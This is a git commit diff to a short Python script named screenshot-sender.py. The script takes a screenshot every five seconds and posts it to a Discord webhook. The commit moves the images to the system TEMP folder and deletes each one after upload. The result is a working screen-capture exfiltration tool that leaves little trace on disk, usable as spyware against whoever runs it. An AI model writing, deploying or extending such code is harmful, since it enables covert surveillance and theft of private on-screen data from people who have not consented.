55ab73439c4ec5dc99e935c28392c4f63bc82bd0
Just a pork <59335048+ThisisaPork@users.noreply.github.com>
2023-05-12 23:19:31 +0800

    Filepath changed to TEMP, auto-delete image feature.

--- screenshot-sender.py
+++ screenshot-sender.py
@@ -1,25 +1,33 @@
-import pyautogui, time, discord, aiohttp, asyncio
+import pyautogui, time, discord, aiohttp, asyncio, os
 from discord import Webhook
+from tempfile import gettempdir
 
 i = 1
 url = "webhook here"
 
-async def anything(url):
+async def anything(url, filePath):
     async with aiohttp.ClientSession() as session:
-        file = discord.File(r'screenshot-'+ str(i) +'.png', filename=r'screenshot-'+ str(i) +'.png')
+        file = discord.File(filePath, filename=r'temp-'+ str(i) +'.png')
         webhook = Webhook.from_url(url, session=session)
         embed = discord.Embed()
-        embed.set_image(url="attachment://"+r'screenshot-'+ str(i) +'.png')
+        embed.set_image(url="attachment://"+r'temp-'+ str(i) +'.png')
         await webhook.send(embed=embed, file=file)
 
 while True:
 
-    pyautogui.screenshot('screenshot-'+ str(i) +'.png')
-    print('screenshot-'+ str(i) +'.png SAVED!.')
+    filePath = gettempdir()+'\\temp-'+ str(i) +'.png' # to make the code more readable although its still bad
+
+    pyautogui.screenshot(filePath)
+    print('temp-'+ str(i) +'.png SAVED!.')
     
     loop = asyncio.new_event_loop()
-    loop.run_until_complete(anything(url))
+    loop.run_until_complete(anything(url, filePath))
     loop.close()
+    
+    try:
+        os.remove(filePath)
+    except OSError as e:
+        print(e)
    
     time.sleep(5)
     i = i + 1
